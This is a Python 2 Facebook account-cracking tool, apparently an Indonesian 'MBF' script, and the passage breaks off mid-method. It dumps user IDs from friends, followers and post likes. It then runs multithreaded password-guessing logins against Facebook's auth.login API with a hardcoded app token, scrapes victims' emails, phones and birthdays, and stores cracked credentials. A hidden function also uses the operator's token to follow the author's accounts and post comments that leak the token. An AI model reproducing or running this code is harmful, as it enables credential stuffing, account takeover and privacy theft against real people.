#!/usr/bin/python2
# coding=utf-8
# code by zugendro

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as mamank
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->

ok = []
cp = []
id = []
user = []
loop = 0
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod teanjar anjar:v'])
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] menghapus token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO zugendro
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By anonim
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Yayan-XD
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com/KM39453'''

lo_ngentod = '1714009362122228'
# crack selesai
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N);exit()

#masuk token
def anonim():
    os.system('clear')
    print (' %s*%s tools ini menggunakan login token facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s*%s ketik %sopen%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
    zugendro = raw_input('\n %s[%s?%s] Token :%s '%(N,M,N,H))
    if zugendro in ('open', 'Open', 'OPEN'):
        print '\n%s *%s note! usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
        print '%s *%s jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
        print '%s *%s setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
        print '%s *%s lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
        raw_input(' %s*%s tekan enter '%(O,N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        anonim()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(zugendro)).json()['name']
        print '\n\n %s*%s selamat datang %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        print ' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,N);time.sleep(2)
        open('.ppk/.hayyuk.txt', 'w').write(zugendro)
        raw_input(' %s*%s tekan enter '%(O,N));wuhan(zugendro)
        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
        hey_tayo()
    except KeyError:
        print '\n\n %s[%s!%s] token invalid'%(N,M,N);time.sleep(2);anonim()

### ORANG GANTENG ###
def hey_tayo():
    os.system('clear')
    try:
    	zugendro = open('.ppk/.hayyuk.txt', 'r').read()
    except IOError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.hayyuk.txt');anonim()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(zugendro)).json()['name']
    except KeyError:
        print '\n %s[%s×%s] token invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.hayyuk.txt');anonim()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(N,M,N))
    print logo
    IP = requests.get('http://ip-api.com/json').json()['query']
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
    print ' [%s2%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
    print ' [%s3%s]. Dump id dari total followers'%(O,N);time.sleep(0.03)
    print ' [%s4%s]. Dump id dari like postingan'%(O,N);time.sleep(0.03)
    print ' [%s5%s]. Mulai crack'%(O,N);time.sleep(0.03)
    print ' [%s6%s]. Check ingformasi akun fb'%(O,N);time.sleep(0.03)
    print ' [%s7%s]. Lihat hasil crack'%(O,N);time.sleep(0.03)
    print ' [%s8%s]. Settings user agent'%(O,N);time.sleep(0.03)
    print ' [%s9%s]. Ingfo %sscript%s'%(O,N,O,N);time.sleep(0.03)
    print ' [%s0%s]. logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
    tempe = raw_input('\n [*] menu : ')
    if tempe == '':
        print '\n %s[%s×%s] jangan kosong anjar!'%(N,M,N);time.sleep(2);hey_tayo()
    elif tempe in['1','01']:
        teman(zugendro)
    elif tempe in['2','02']:
        publik(zugendro)
    elif tempe in['3','03']:
        followers(zugendro)
    elif tempe in['4','04']:
        postingan(zugendro)
    elif tempe in['5','05']:
        __crack__().plerr()
    elif tempe in['6','06']:
        cek_ingfo(zugendro)
    elif tempe in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n [ hasil crack yang tersimpan di file anda ]\n'
            for file in dirs:
                print(" [%s+%s] %s"%(O,N,file))
            file = raw_input("\n [%s?%s] masukan nama file :%s "%(M,N,H))
            if file == "":
                file = raw_input("\n [%s?%s] masukan nama file :%s %s"%(M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            print(" [%s×%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s\n"%(O,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            os.system("cat results/%s"%(file))
            print("\n %s[%s#%s] --------------------------------------------"%(N,O,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));hey_tayo()
        except (IOError):
            print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
            raw_input('\n  [ %sKEMBALI%s ] '%(O,N));hey_tayo()
    elif tempe in['8','08']:
        seting_ngoke()
    elif tempe in['9','09']:
        info_tools()
    elif tempe in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .ppk/.hayyuk.txt')
        jalan('\n %s[%s✓%s]%s berhasil menghapus token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,tempe,N);time.sleep(2);hey_tayo()

# enjoyer
def wuhan(zugendro):
    try:
        anjar = zugendro
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(anjar))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,anjar))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,anjar,anjar))
        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,anjar))
    except:
    	pass

# dump id dari teman hehe
def teman(zugendro):
    try:
        os.mkdir('dump')
    except:pass
    try:
        ezz = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
        eoa = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        cin = ('dump/' + ezz + '.json').replace(' ', '_')
        ys  = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(eoa,zugendro)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));hey_tayo()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));hey_tayo()
'''
																																																				cnn = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''

# dump id dari teman publik hehe
def publik(zugendro):
    try:
        os.mkdir('dump')
    except:pass
    try:
        cnn = raw_input('\n %s[%s?%s] id publik  : '%(N,O,N))
        que = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        nob = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        zxe = ('dump/' + que + '.json').replace(' ', '_')
        ys  = open(zxe, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(cnn,nob,zugendro)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,zxe,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));hey_tayo()
    except (KeyError,IOError):
        os.remove(zxe)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));hey_tayo()

# dump id dari followers hehe
def followers(zugendro):
    try:
        os.mkdir('dump')
    except:pass
    try:
        cnn = raw_input('\n %s[%s?%s] id follow  : '%(N,O,N))
        ezz = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        eoa = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        ah  = ('dump/' + ezz + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(cnn,eoa,zugendro)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));hey_tayo()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));hey_tayo()

# dump id dari postingan hehe
def postingan(zugendro):
    try:
        os.mkdir('dump')
    except:pass
    try:
        cnn = raw_input('\n %s[%s?%s] id posting : '%(N,O,N))
        ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
        eoa = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
        que = ('dump/' + ppk + '.json').replace(' ', '_')
        ys  = open(que, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(cnn,eoa,zugendro)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,que,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));hey_tayo()
    except (KeyError,IOError):
        os.remove(que)
        jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N));hey_tayo()

# cek ingfo
def cek_ingfo(zugendro):
    try:
        user = raw_input("\n [%s+%s] masukan id atau username : "%(O,N))
        if user == '':
            print "\n [%s!%s] jangan kosong bro"%(M,N);cek_ingfo(zugendro)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, zugendro)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n  * Ingformasi akun Facebook *';time.sleep(0.03)
    print '\n [*] nama lengkap : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print ' [*] nama depan   : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    except: pass
    print ' [*] nama belakang: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    except: pass
    print ' [*] username fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	usa = x['id']
    except (KeyError, IOError):
    	usa = '%s-%s'%(M,N)
    except: pass
    print ' [*] id facebook  : %s'%(usa);time.sleep(0.03)
    print '\n  * data-data akun facebook *\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    except: pass
    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    except: pass
    print ' [*] nomor telepon  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    except: pass
    print ' [*] tanggal lahir  : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Perempuan").replace("male", "Laki-laki")
    except (KeyError, IOError):
    	jenis = ''
    except: pass
    print ' [*] jenis kelamin  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, zugendro))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except: pass
    print ' [*] jumblah teman  : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, zugendro))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    except: pass
    print ' [*] total followers: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    except: pass
    print ' [*] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    except: pass
    try:
    	dgn = '''dengan %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print ' [*] status hubungan: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print ' [*] tentang status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print ' [*] kota asal      : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print ' [*] tinggal di     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print ' [*] zona waktu     : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print ' [*] terakhir di updated pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/anonim_'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n  [ %sKEMBALI%s ] '%(O,N));hey_tayo()

### ganti user agent
def seting_ngoke():
    print '\n (%s1%s) ganti user agent'%(O,N)
    print ' (%s2%s) check user agent'%(O,N)
    coro = raw_input('\n %s[%s?%s] choose : '%(N,O,N))
    if coro == '':
        print '\n %s[%s×%s] Gak boleh kosong anjar'%(N,M,N);time.sleep(2);seting_ngoke()
    elif coro =='1':
        ai_eu()
    elif coro =='2':
        check_ngoke()
    else:
        print '\n %s[%s×%s] input yang bener'%(N,M,N);time.sleep(2);seting_ngoke()

# User Agent baru
def ai_eu():
    os.system('rm -rf ngoke.txt')
    print '\n %s(%s•%s) notice me: cari User Agent di google chrome.'%(N,O,N)
    print ' (%s×%s) ketik User Agent atau My User Agent....\n'%(M,N)
    kucing = raw_input(' [%s?%s] Masukan User Agent :%s '%(O,N,H))
    if kucing == '':
        print '\n %s[%s×%s] Gak boleh kosong anjar'%(N,M,N);ai_eu()
    try:
        open('ngoke.txt', 'w').write(kucing);time.sleep(2)
        jalan('\n %s[%s✓%s] berhasil mengganti user agent...'%(N,H,N))
        raw_input('\n  %s[ %skembali%s ]'%(N,O,N));hey_tayo()
    except:pass

# Cek User Agent
def check_ngoke():
    try:
        user_agent = open('ngoke.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n %s[%s+%s] User Agent anda : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n  %s[ %skembali%s ]'%(N,O,N));hey_tayo()

# starting
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] masukan file : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,N);time.sleep(3);hey_tayo()
        ___mamank___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___mamank___ in ('Y', 'y'):
            print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
                        elif cin == '1':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with mamank(max_workers=30) as (__anonim__):
                                for begone in self.id:
                                    try:
                                        shoot = begone.split('<=>')[0]
                                        __anonim__.submit(self.__api__, shoot, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with mamank(max_workers=30) as (__anonim__):
                                for begone in self.id:
                                    try:
                                        shoot = begone.split('<=>')[0]
                                        __anonim__.submit(self.__mbasic__, shoot, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with mamank(max_workers=30) as (__anonim__):
                                for begone in self.id:
                                    try:
                                        shoot = begone.split('<=>')[0]
                                        __anonim__.submit(self.__mfb__, shoot, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [%s1%s]. method API (fast)'%(O,N)
                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___mamank___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [%s1%s]. method API (fast)'%(O,N)
            print ' [%s2%s]. method mbasic (slow)'%(O,N)
            print ' [%s3%s]. method mobile (super slow)'%(O,N)
            self.__pler__()
        else:
            print '\n %s[%s×%s] y/t heeey!'%(N,M,N);time.sleep(2);hey_tayo()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_zugendro = open('ngoke.txt', 'r').read()
            except (KeyError, IOError):
            	_zugendro = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _zugendro, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    zugendro = open('.ppk/.hayyuk.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,zugendro)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
